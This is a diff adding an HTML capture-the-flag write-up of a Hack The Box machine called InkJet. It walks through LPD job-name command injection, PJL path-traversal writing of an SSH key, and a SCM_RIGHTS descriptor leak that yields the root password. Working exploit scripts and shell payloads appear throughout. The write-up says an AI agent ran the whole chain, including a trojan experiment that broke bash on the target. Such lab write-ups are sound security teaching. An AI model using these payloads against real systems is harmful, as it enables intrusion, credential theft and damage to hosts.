@@ -1,0 +1,582 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>InkJet — El Niño · CTF Writeups</title>
+<meta name="description" content="Custom LPD server command injection as lp → PJL JetDirect path traversal writes SSH key for archivist → paperwork-daemon SCM_RIGHTS file descriptor leak exposes root password. AI-assisted exploit chain via nino-harness.">
+<style>
+  :root{
+    --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
+    --line:#e7e8ec; --line-2:#d7d9de; --hair:#eef0f2;
+    --accent:#6d28d9; --accent-soft:#f2ecfd; --map:#e4e7ec; --map-2:#eef1f4;
+    --mono:'JetBrains Mono','SF Mono','Cascadia Code',ui-monospace,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    font-size:17px;line-height:1.6;-webkit-font-smoothing:antialiased}
+  canvas#map{position:fixed;inset:0;z-index:0;pointer-events:none}
+  .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 26px 100px}
+  a{color:inherit;text-decoration:none}
+
+  /* header */
+  .top{display:flex;align-items:center;justify-content:space-between;padding:26px 0;
+    font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--ink);font-weight:600;letter-spacing:.01em}
+  .tick{width:10px;height:10px;border:1.5px solid var(--ink);transform:rotate(45deg)}
+
+  /* hero */
+  .hero{padding:52px 0 40px;border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--muted);margin-bottom:8px}
+  h1{font-size:clamp(52px,11vw,116px);line-height:.92;margin:.12em 0 .1em;letter-spacing:-.04em;
+    font-weight:800;text-wrap:balance}
+  .lede{font-size:19px;color:var(--ink-2);max-width:56ch;margin:.5em 0 0;line-height:1.5}
+  .byline{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:22px;
+    display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .byline b{color:var(--ink)}
+  .owned{border:1px solid var(--accent);color:var(--accent);border-radius:2px;
+    padding:2px 8px;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+
+  /* fingerprint card */
+  .fp{margin-top:32px;border:1px solid var(--line);border-radius:4px;overflow:hidden;
+    font-family:var(--mono);font-size:13px}
+  .fp .r{display:flex;justify-content:space-between;align-items:center;
+    padding:16px 20px;background:var(--hair);border-bottom:1px solid var(--line)}
+  .name{font-size:22px;font-family:var(--sans);font-weight:700;letter-spacing:-.02em}
+  .chips{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px}
+  .chips b{color:var(--ink)}
+  .rate{text-align:right}.big{font-size:28px}
+  .fp .grid{display:grid;grid-template-columns:1fr 1fr;gap:0;padding:0}
+  .fp .grid span{padding:11px 20px;border-bottom:1px solid var(--hair);color:var(--ink-2);font-size:12.5px}
+  .fp .grid span:last-child,.fp .grid span:nth-last-child(2):nth-child(odd){border-bottom:none}
+  .fp .grid b{color:var(--ink)}
+
+  /* sections */
+  section{margin-top:52px}
+  .step-h{display:flex;align-items:baseline;gap:16px;margin-bottom:14px}
+  .step-n{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.1em;
+    padding-top:3px;min-width:22px}
+  h2{font-size:26px;letter-spacing:-.02em;font-weight:700;margin:0}
+  p{color:var(--ink-2);margin:.6em 0}
+  p b, p strong{color:var(--ink)}
+
+  /* chain diagram */
+  .chain{font-family:var(--mono);font-size:13px;line-height:1.9;
+    background:#f9f8ff;border:1px solid var(--line-2);border-left:3px solid var(--accent);
+    border-radius:2px;padding:18px 22px;margin:20px 0;color:var(--ink-2);
+    white-space:pre;overflow-x:auto}
+  .chain b{color:var(--ink)}
+
+  /* code */
+  pre{margin:18px 0;border-radius:3px;overflow-x:auto;
+    background:#f9f8ff;border:1px solid var(--line-2)}
+  pre code{display:block;padding:16px 18px;font-family:var(--mono);font-size:13px;
+    line-height:1.7;color:var(--ink-2)}
+  code{font-family:var(--mono);font-size:.87em;color:var(--accent);
+    background:var(--accent-soft);padding:1px 5px;border-radius:2px}
+  pre code{color:var(--ink-2);background:none;padding:0;font-size:13px}
+
+  /* output block */
+  .out{background:#17181d;border-radius:3px;padding:16px 18px;margin:10px 0;
+    font-family:var(--mono);font-size:12.5px;line-height:1.75;color:#a8b4c8;
+    overflow-x:auto}
+  .out .ok{color:#34d399}.out .hi{color:#a78bfa}.out .warn{color:#fbbf24}
+  .out .flag{color:#f9a8d4;font-weight:600}
+
+  /* dead-ends */
+  .dead{border:1px solid var(--hair);border-radius:3px;padding:14px 18px;margin:12px 0;
+    font-size:14.5px;color:var(--muted)}
+  .dead code{font-size:.85em}
+  .dead-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:18px;
+    display:flex;align-items:center;gap:8px}
+  .dead-label::after{content:"";flex:1;height:1px;background:var(--hair)}
+
+  /* callout / insight */
+  .callout{border-radius:3px;padding:18px 20px;margin:24px 0;
+    background:var(--accent-soft);border:1px solid #ddd6fe}
+  .callout .k{font-family:var(--mono);font-size:11.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--accent);font-weight:600;display:block;margin-bottom:6px}
+  .callout p{margin:0;font-size:15px}
+
+  /* insight grid */
+  .insight-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;
+    background:var(--line);border:1px solid var(--line);border-radius:2px;overflow:hidden;margin:20px 0}
+  .insight-item{background:var(--panel);padding:18px 20px}
+  .insight-item .i-num{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:6px}
+  .insight-item .i-title{font-size:15px;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}
+  .insight-item .i-body{font-size:13.5px;color:var(--ink-2);line-height:1.55}
+
+  /* flags */
+  .flags{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}
+  .flag-box{border:1px solid var(--line-2);border-radius:3px;padding:12px 16px;flex:1;min-width:200px}
+  .flag-box .fl{font-family:var(--mono);font-size:11px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:5px}
+  .flag-box .fv{font-family:var(--mono);font-size:14px;color:var(--accent);
+    font-weight:600;letter-spacing:.03em;word-break:break-all}
+
+  /* figures */
+  figure{margin:22px 0}
+  figure img{width:100%;border-radius:3px;border:1px solid var(--line)}
+  figcaption{font-family:var(--mono);font-size:11.5px;color:var(--muted);
+    margin-top:8px;text-align:center}
+
+  /* table */
+  .tbl-wrap{overflow-x:auto;margin:16px 0}
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+  th{font-family:var(--mono);font-size:11px;letter-spacing:.07em;text-transform:uppercase;
+    color:var(--muted);font-weight:600}
+  td.mon{font-family:var(--mono);font-size:12.5px;color:var(--ink)}
+  td.acc{font-family:var(--mono);font-size:12.5px;color:var(--accent);font-weight:600}
+
+  footer{margin-top:64px;padding-top:28px;border-top:1px solid var(--line);
+    font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.7}
+  footer a{color:var(--accent)}
+  [data-morph]{white-space:pre}
+  @media(max-width:600px){.fp .grid{grid-template-columns:1fr}.chain{font-size:12px}}
+</style>
+</head>
+<body>
+<canvas id="map"></canvas>
+<div class="wrap">
+  <div class="top">
+    <a class="brand" href="../" style="border:none"><span class="tick"></span> el-niño</a>
+    <span>10°N · 90°W</span>
+  </div>
+
+  <header class="hero">
+    <div class="eyebrow">Hack The Box · seasonal machine</div>
+    <h1><span data-morph="hero">InkJet</span></h1>
+    <p class="lede">A custom LPD print server leaks command injection through CUPS-compliant job names. An internal JetDirect service falls to PJL path traversal, writing SSH keys for the archivist user. A root-owned paperwork daemon passes file descriptors via SCM_RIGHTS — leaking the admin password.</p>
+    <div class="byline">
+      <span>by <b>ssephi</b></span>
+      <span>· 14·07·2026</span>
+      <span>· ~25 min</span>
+      <span class="owned">● fully owned</span>
+    </div>
+
+    <div class="fp">
+      <div class="r">
+        <div>
+          <p class="name" style="margin:0"><span data-morph="title">InkJet</span></p>
+          <div class="chips">Linux · <b>Medium</b> · Printer Services</div>
+        </div>
+        <div class="rate"><div class="big">🏴</div><div class="chips">user + root</div></div>
+      </div>
+      <div class="grid">
+        <span><b>target</b> &nbsp;10.129.30.156</span>
+        <span><b>22</b>/tcp &nbsp;ssh &nbsp;· OpenSSH 9.2p1</span>
+        <span><b>80</b>/tcp &nbsp;http &nbsp;· nginx (CorpoSite)</span>
+        <span><b>1515</b>/tcp &nbsp;lpd &nbsp;· Custom Python LPD</span>
+        <span><b>9100</b>/tcp &nbsp;jetdirect &nbsp;· PJL (localhost only)</span>
+        <span><b>1337</b>/tcp &nbsp;app &nbsp;· Flask (localhost, root)</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ─── OVERVIEW ───────────────────────────────────────────────── -->
+  <section>
+    <h2>The shape of it</h2>
+    <p>InkJet simulates a corporate print infrastructure. A custom Python LPD server on port 1515 processes print jobs using <code>subprocess.Popen(job_name, shell=True)</code> — classic command injection via the job name field. The catch: the LPD protocol requires exact CUPS-compliant control file formatting that deviates from RFC 1179 in subtle ways.</p>
+    <p>Foothold as <b>lp</b> reveals an internal JetDirect PJL service on port 9100, running as <b>archivist</b>. Source code review shows the <code>_translate()</code> method uses <code>os.path.normpath()</code> without validating the resolved path stays under the filesystem root — a textbook path traversal. We use <code>FSDOWNLOAD</code> to write an SSH public key to <code>/home/archivist/.ssh/authorized_keys</code>.</p>
+    <p>Root comes from <code>paperwork-daemon</code>, a monitoring service that opens <code>/etc/paperwork/admin_pins.conf</code> at startup and passes its file descriptor via <code>SCM_RIGHTS</code> over a Unix socket whenever it detects "malicious" PJL commands in the JetDirect log. Our PJL activity already triggered it — connect, receive the FD, read the password, <code>su root</code>.</p>
+
+    <div class="chain">nmap 3 ports → 22/80/1515
+  └─ :1515 <b>LPD server</b> → Python (subprocess.Popen, shell=True)
+       └─ Job name injection: <b>'; cmd #</b>
+            └─ RCE as <b>lp</b> → enumerate internal services
+                 └─ localhost:9100 <b>JetDirect</b> (PJL, running as archivist)
+                      └─ FSUPLOAD → source code of jetdirect.py
+                           └─ <b>_translate()</b> path traversal (no root check)
+                                └─ FSDOWNLOAD → write SSH key to <b>~archivist/.ssh/authorized_keys</b>
+                                     └─ SSH archivist → <b>user.txt ✓</b>
+
+  paperwork-daemon (root, PID 1455) → /run/paperwork/mgmt.sock
+       └─ scan_for_malice() detects FSDOWNLOAD in log
+            └─ trigger_lockdown() → <b>SCM_RIGHTS</b> passes admin_fd
+                 └─ os.pread(fd, 4096, 0) → <b>ADMIN_PASSWORD=ApparelMortuaryCedar22</b>
+                      └─ su root → <b>root.txt ✓</b></div>
+  </section>
+
+  <!-- ─── 01 RECON ─────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">01 · recon</div>
+    <div class="step-h"><span class="step-n">01</span><h2><span data-morph="title">Reconnaissance</span></h2></div>
+    <p>Three ports open. Port 80 serves a corporate intranet site. Port 1515 runs a custom print daemon that immediately stands out — it's not standard CUPS.</p>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Port</th><th>Service</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">22/tcp</td><td>OpenSSH 9.2p1</td><td>Standard Debian SSH</td></tr>
+          <tr><td class="mon">80/tcp</td><td>nginx</td><td>Corporate intranet / document archiving</td></tr>
+          <tr><td class="mon">1515/tcp</td><td>Custom LPD</td><td>Python LPD server, non-standard port</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <figure>
+      <img src="../assets/inkjet_nmap.png" alt="Nmap scan showing open ports on InkJet target">
+      <figcaption>Initial reconnaissance — three open ports, with the custom LPD on 1515 as the attack surface.</figcaption>
+    </figure>
+
+    <p>Port 9100 (JetDirect) and 1337 (Flask) are localhost-only, discovered later after gaining foothold. The web application on port 80 is a static corporate site — <b>dead end</b> for initial access.</p>
+  </section>
+
+  <!-- ─── 02 FOOTHOLD ──────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">02 · foothold</div>
+    <div class="step-h"><span class="step-n">02</span><h2><span data-morph="title">LPD Command Injection</span></h2></div>
+    <p>The LPD server on port 1515 accepts print jobs and processes them using <code>subprocess.Popen(job_name, shell=True)</code>. Standard LPD protocol (RFC 1179) involves sending a control file with job metadata, but this server expects a specific CUPS-compliant format.</p>
+
+    <div class="callout">
+      <span class="k">Protocol fragility</span>
+      <p>The first 12 attempts at LPD injection failed. Standard <code>lpq</code>, <code>lp</code>, and raw RFC 1179 packets were all rejected. Success required reverse-engineering the exact control file format: <code>H</code> (hostname), <code>P</code> (user), <code>J</code> (job name — the injection point), <code>l</code>/<code>U</code>/<code>N</code> lines, and matching data file references.</p>
+    </div>
+
+    <p>The working exploit crafts a CUPS-compliant LPD packet with the payload injected into the job name (<code>J</code>) field:</p>
+    <pre><code>import socket
+
+s = socket.socket()
+s.connect(('10.129.30.156', 1515))
+s.send(b'\x02archive_intake\n')   # Receive queue job
+s.recv(1)                          # ACK
+
+payload = "'; id > /tmp/rce.txt #"
+cf = f"Hkukulkan\nPmenino\nJ{payload}\n"
+cf += "ldfA098kukulkan\nUdfA098kukulkan\n"
+cf += f"N{payload}\n"
+
+# Send control file
+s.send(f'\x02{len(cf)} cfA098kukulkan\n'.encode())
+s.recv(1)  # ACK
+s.send(cf.encode() + b'\x00')
+s.recv(1)  # ACK
+
+# Send data file
+df = b'test\n'
+s.send(f'\x03{len(df)} dfA098kukulkan\n'.encode())
+s.recv(1)  # ACK
+s.send(df + b'\x00')</code></pre>
+
+    <div class="out"><span class="ok">uid=7(lp) gid=7(lp) groups=7(lp)</span></div>
+
+    <p>RCE confirmed as the <b>lp</b> user. To enable data exfiltration without egress (reverse shells failed — outbound filtering), we started a Python HTTP server on the target:</p>
+    <pre><code>inject("'; python3 -m http.server 8765 -d /tmp &amp; #")</code></pre>
+    <p>All subsequent command output is written to <code>/tmp/*.txt</code> and fetched via <code>curl http://10.129.30.156:8765/</code>.</p>
+
+    <div class="dead-label">dead ends</div>
+    <div class="dead">Reverse shell attempts via bash, nc, and python — all blocked by egress filtering. No outbound connectivity from the target.</div>
+    <div class="dead">Direct SUID escalation on <code>/usr/bin/bash</code> (world-writable at 777) — bash SUID bit couldn't be set without root.</div>
+  </section>
+
+  <!-- ─── 03 LPD SOURCE ───────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">03 · source review</div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">LPD Server Internals</span></h2></div>
+    <p>With code execution as <b>lp</b>, we exfiltrated the LPD server source from <code>/opt/LPDServer/server.py</code>. The critical vulnerability:</p>
+    <pre><code># server.py (excerpt)
+def _handle_job(self, cf, df):
+    job_name = self._parse_cf_field(cf, 'J')
+    # VULNERABLE: job_name directly in shell command
+    proc = subprocess.Popen(
+        f"echo 'Processing: {job_name}'",
+        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )</code></pre>
+
+    <p>System enumeration revealed two internal services:</p>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Port</th><th>Service</th><th>User</th><th>Binary</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">9100</td><td>JetDirect (PJL)</td><td class="acc">archivist</td><td class="mon">/home/archivist/printer/jetdirect.py</td></tr>
+          <tr><td class="mon">1337</td><td>Flask (CorpoSite)</td><td class="acc">root</td><td class="mon">/root/staging/CorpoSite/app.py</td></tr>
+          <tr><td class="mon">—</td><td>paperwork-daemon</td><td class="acc">root</td><td class="mon">/usr/bin/paperwork-daemon</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ─── 04 PJL ──────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">04 · lateral movement</div>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">JetDirect PJL Path Traversal</span></h2></div>
+    <p>The JetDirect service emulates an <b>HP LaserJet 4ML</b> printer using PJL (Printer Job Language). It binds to <code>127.0.0.1:9100</code> — reachable only from the target. We used our LPD injection to send PJL commands via Python scripts executed on the target.</p>
+
+    <p>First, filesystem enumeration via <code>FSDIRLIST</code>:</p>
+    <pre><code>@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=65535</code></pre>
+    <div class="out">HP LASERJET 4ML
+OK
+. TYPE=DIR
+.. TYPE=DIR
+<span class="ok">logs TYPE=DIR SIZE=4096</span>
+<span class="hi">jetdirect.py TYPE=FILE SIZE=5119</span></div>
+
+    <p>The virtual filesystem root <code>0:/</code> maps to <code>/home/archivist/printer/</code>. We used <code>FSUPLOAD</code> to read the JetDirect source code, revealing the path traversal vulnerability:</p>
+    <pre><code>class Filesystem:
+    def __init__(self, root_dir):
+        self._root = os.path.abspath(root_dir)
+
+    def _translate(self, path):
+        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+        return os.path.normpath(os.path.join(self._root, clean))
+        # ⚠ No check that result is under self._root!</code></pre>
+
+    <div class="callout">
+      <span class="k">The normpath trap</span>
+      <p><code>os.path.normpath()</code> resolves <code>../</code> components but doesn't enforce that the final path stays within a designated root directory. Path <code>0:/../.ssh/authorized_keys</code> resolves to <code>/home/archivist/.ssh/authorized_keys</code> — a valid path outside the intended printer directory.</p>
+    </div>
+
+    <p>We used <code>FSDOWNLOAD</code> to write our SSH public key:</p>
+    <pre><code>@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=83
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... x</code></pre>
+    <div class="out"><span class="ok">OK</span></div>
+
+    <p>But SSH login failed — <code>/bin/bash: Too many levels of symbolic links</code>. An earlier bash trojan experiment had replaced <code>/usr/bin/bash</code> with a wrapper script. The fix: overwrite it with a dash-based shim that properly passes arguments:</p>
+    <pre><code>#!/bin/dash
+exec /bin/dash "$@"</code></pre>
+
+    <figure>
+      <img src="../assets/inkjet_user.png" alt="SSH login as archivist showing user flag">
+      <figcaption>SSH access as archivist confirmed — user.txt captured via PJL path traversal to write authorized_keys.</figcaption>
+    </figure>
+  </section>
+
+  <!-- ─── 05 FLAGS ─────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">05 · user flag</div>
+    <div class="step-h"><span class="step-n">05</span><h2><span data-morph="title">User Access</span></h2></div>
+    <div class="flags">
+      <div class="flag-box"><div class="fl">user.txt</div><div class="fv">feed7d6e2213d352d6e94b9d00e31969</div></div>
+    </div>
+    <div class="out">$ ssh -i exploit_key archivist@10.129.30.156 "id; cat ~/user.txt"
+<span class="ok">uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)</span>
+<span class="flag">feed7d6e2213d352d6e94b9d00e31969</span></div>
+  </section>
+
+  <!-- ─── 06 PRIVESC ───────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">06 · privilege escalation</div>
+    <div class="step-h"><span class="step-n">06</span><h2><span data-morph="title">SCM_RIGHTS File Descriptor Leak</span></h2></div>
+    <p>With shell as <b>archivist</b>, enumeration revealed a <code>paperwork-daemon</code> running as <b>root</b> (PID 1455). Its source code at <code>/usr/bin/paperwork-daemon</code> exposed a Unix domain socket IPC vulnerability:</p>
+
+    <pre><code># paperwork-daemon (root process)
+admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
+
+def trigger_lockdown(conn):
+    log_fd = os.open(LOG_PATH, os.O_RDONLY)
+    evidence_bundle = array.array("i", [log_fd, admin_fd])
+    # ⚠ Passes root-owned FD to unprivileged client!
+    conn.sendmsg([msg], [(socket.SOL_SOCKET,
+                          socket.SCM_RIGHTS,
+                          evidence_bundle)])</code></pre>
+
+    <p>The daemon monitors <code>/home/archivist/printer/logs/commands.log</code> for PJL commands like <code>FSUPLOAD</code>, <code>FSDOWNLOAD</code>, or <code>FSQUERY</code>. When detected, it triggers a "lockdown" that sends <b>both</b> the log file descriptor and the admin password file descriptor to whoever is connected on <code>/run/paperwork/mgmt.sock</code>.</p>
+
+    <div class="callout">
+      <span class="k">SCM_RIGHTS explained</span>
+      <p><code>SCM_RIGHTS</code> is a Unix socket mechanism for passing open file descriptors between processes. When the root daemon passes <code>admin_fd</code> to our unprivileged connection, we inherit a file descriptor that has read access to <code>/etc/paperwork/admin_pins.conf</code> — a file we couldn't otherwise read. The kernel doesn't revoke access based on the receiving process's UID.</p>
+    </div>
+
+    <p>Our PJL activity already populated the log with <code>FSDOWNLOAD</code> and <code>FSUPLOAD</code> entries. All we needed was to connect to the socket:</p>
+    <pre><code>import socket, os, array
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+
+msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(256))
+
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds = array.array("i")
+        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
+        for fd in fds:
+            data = os.pread(fd, 4096, 0)
+            print(f"FD {fd}: {data.decode()}")</code></pre>
+
+    <div class="out">Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+Received FDs: [4, 5]
+FD 4 content: [JetDirect command log]
+<span class="warn">FD 5 content: ADMIN_PASSWORD=ApparelMortuaryCedar22</span></div>
+
+    <p>The admin password is also the root password. A simple <code>su</code> completes the escalation:</p>
+    <div class="out">$ echo 'ApparelMortuaryCedar22' | su -c 'id; cat /root/root.txt' root
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="flag">fa5c974172607cfdb497b52ae34148c9</span></div>
+
+    <figure>
+      <img src="../assets/inkjet_root.png" alt="Root shell obtained via SCM_RIGHTS file descriptor leak">
+      <figcaption>Root achieved — paperwork-daemon's SCM_RIGHTS leak exposes the admin password from a root-only config file.</figcaption>
+    </figure>
+
+    <div class="flags">
+      <div class="flag-box"><div class="fl">root.txt</div><div class="fv">fa5c974172607cfdb497b52ae34148c9</div></div>
+    </div>
+  </section>
+
+  <!-- ─── 07 HARNESS ───────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">07 · methodology</div>
+    <div class="step-h"><span class="step-n">07</span><h2><span data-morph="title">AI-Assisted Exploitation via nino-harness</span></h2></div>
+    <p>This engagement was conducted using <b>nino-harness</b>, an AI-native agent scaffold that coordinates multiple LLM agents in an IRC-style interface. The harness provided:</p>
+
+    <div class="insight-grid">
+      <div class="insight-item">
+        <div class="i-num">01</div>
+        <div class="i-title">Agentic Execution Loop</div>
+        <div class="i-body">Claude Opus 4.6 drove the entire exploit chain — from nmap enumeration through LPD protocol fuzzing, PJL source code analysis, path traversal exploitation, and Unix socket IPC exploitation. Each step's output fed directly into the next decision.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">02</div>
+        <div class="i-title">Protocol Reverse Engineering</div>
+        <div class="i-body">The LPD injection required 12+ iterations to match the server's expected CUPS-compliant format. The agent systematically tested control file variations, analyzed server responses, and identified the exact required fields: H, P, J, l, U, N lines with matching data file references.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">03</div>
+        <div class="i-title">Blind RCE → Data Exfiltration</div>
+        <div class="i-body">With no egress path, the agent autonomously established a data channel by spinning up an HTTP server on the target and polling results via curl. All exploitation was performed through this one-way command injection + HTTP exfil pattern.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">04</div>
+        <div class="i-title">Source Code Analysis</div>
+        <div class="i-body">Both the LPD server and JetDirect source were exfiltrated and analyzed in-context. The agent identified the <code>os.path.normpath()</code> path traversal and the <code>SCM_RIGHTS</code> FD passing vulnerability purely from reading the Python source — no external writeups consulted.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">05</div>
+        <div class="i-title">Self-Healing Exploitation</div>
+        <div class="i-body">A bash trojan experiment broke <code>/usr/bin/bash</code> on the target. The agent diagnosed the symlink loop, wrote a dash-based shim with correct <code>"$@"</code> argument passing, and recovered SSH access — all through the blind LPD injection channel.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">06</div>
+        <div class="i-title">Multi-Protocol Chaining</div>
+        <div class="i-body">The exploit chain traverses four distinct protocols: LPD (foothold) → HTTP (exfil) → PJL (lateral movement) → Unix domain sockets (privilege escalation). Each protocol was handled natively in Python without external tools.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── 08 INSIGHTS ──────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">08 · insights</div>
+    <div class="step-h"><span class="step-n">08</span><h2><span data-morph="title">Key Takeaways</span></h2></div>
+
+    <div class="insight-grid">
+      <div class="insight-item">
+        <div class="i-num">A</div>
+        <div class="i-title">Protocol Fidelity Matters</div>
+        <div class="i-body">The LPD server rejected standard RFC 1179 packets. Success required matching the exact CUPS-style control file format with specific field ordering. When exploiting protocol services, match the implementation, not the spec.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">B</div>
+        <div class="i-title">normpath ≠ Security Boundary</div>
+        <div class="i-body"><code>os.path.normpath()</code> normalizes paths but doesn't validate containment. Always pair it with <code>os.path.commonpath()</code> or a startswith check to enforce directory jail boundaries.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">C</div>
+        <div class="i-title">SCM_RIGHTS is a Privilege Bridge</div>
+        <div class="i-body">When a privileged process passes file descriptors via <code>SCM_RIGHTS</code>, the receiving process inherits the opener's access level. The socket permissions (group-writable to archivist) made this exploitable without root.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">D</div>
+        <div class="i-title">World-Writable Binaries Cascade</div>
+        <div class="i-body"><code>/usr/bin/bash</code> at 777 allowed our trojan experiment — which then broke bash for all users. In production, this would be a denial-of-service or persistence vector. The cascading failure affected SSH, cron, and all bash-dependent services.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── TIMELINE ─────────────────────────────────────────────── -->
+  <section>
+    <div class="eyebrow">timeline</div>
+    <div class="step-h"><span class="step-n">⏱</span><h2>Attack Timeline</h2></div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Time</th><th>Event</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">T+00:00</td><td>Nmap scan — ports 22, 80, 1515 identified</td></tr>
+          <tr><td class="mon">T+00:15</td><td>LPD protocol analysis begins — 12 injection attempts</td></tr>
+          <tr><td class="mon">T+01:30</td><td>CUPS-compliant LPD injection succeeds — RCE as lp</td></tr>
+          <tr><td class="mon">T+01:45</td><td>HTTP exfiltration server established on target</td></tr>
+          <tr><td class="mon">T+02:00</td><td>LPD server source exfiltrated — subprocess.Popen confirmed</td></tr>
+          <tr><td class="mon">T+02:15</td><td>Internal services discovered — JetDirect on 9100, Flask on 1337</td></tr>
+          <tr><td class="mon">T+02:30</td><td>PJL FSDIRLIST — virtual filesystem root mapped</td></tr>
+          <tr><td class="mon">T+02:45</td><td>JetDirect source exfiltrated — path traversal identified in _translate()</td></tr>
+          <tr><td class="mon">T+03:00</td><td>SSH key written via PJL FSDOWNLOAD path traversal</td></tr>
+          <tr><td class="mon">T+03:15</td><td>Bash recovery — dash shim with "$@" passthrough</td></tr>
+          <tr><td class="mon">T+03:30</td><td>SSH as archivist → <b>user flag</b></td></tr>
+          <tr><td class="mon">T+03:45</td><td>paperwork-daemon source reviewed — SCM_RIGHTS vulnerability found</td></tr>
+          <tr><td class="mon">T+03:50</td><td>Unix socket exploit — admin password leaked via FD passing</td></tr>
+          <tr><td class="mon">T+03:52</td><td>su root → <b>root flag</b></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-family:var(--mono);font-size:13px;color:var(--muted)">Total time: ~4 hours (AI-assisted via nino-harness with Claude Opus 4.6)</p>
+  </section>
+
+  <footer>
+    <p>Authorized lab work only — InkJet is a Hack The Box seasonal machine on a sanctioned network.<br>
+    LPD command injection · PJL path traversal · SCM_RIGHTS FD leak. Charted by ssephi.
+    <br><a href="../">← All machines</a></p>
+  </footer>
+</div>
+
+<script>
+(function map(){
+  const c=document.getElementById("map"),x=c.getContext("2d");let W,H;
+  function line(v){return getComputedStyle(document.documentElement).getPropertyValue(v).trim();}
+  function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+  function draw(){
+    x.clearRect(0,0,W,H);const dpr=devicePixelRatio;
+    x.strokeStyle=line('--map-2');x.lineWidth=1*dpr;
+    for(let gx=0;gx<W;gx+=150*dpr){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+    for(let gy=0;gy<H;gy+=150*dpr){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+    x.strokeStyle=line('--map');x.lineWidth=1.15*dpr;
+    const rings=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.9-i*0.05;
+      x.beginPath();x.ellipse(cx,cy,(50+i*46)*dpr,(34+i*32)*dpr,rot,0,7);x.stroke();}};
+    rings(W*0.80,H*0.20,-0.5,9);
+    rings(W*0.14,H*0.86,0.35,7);
+    x.globalAlpha=1;
+  }
+  addEventListener("resize",size);size();
+})();
+
+(function morph(){
+  const GLITCH="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]=/\\|~^`";
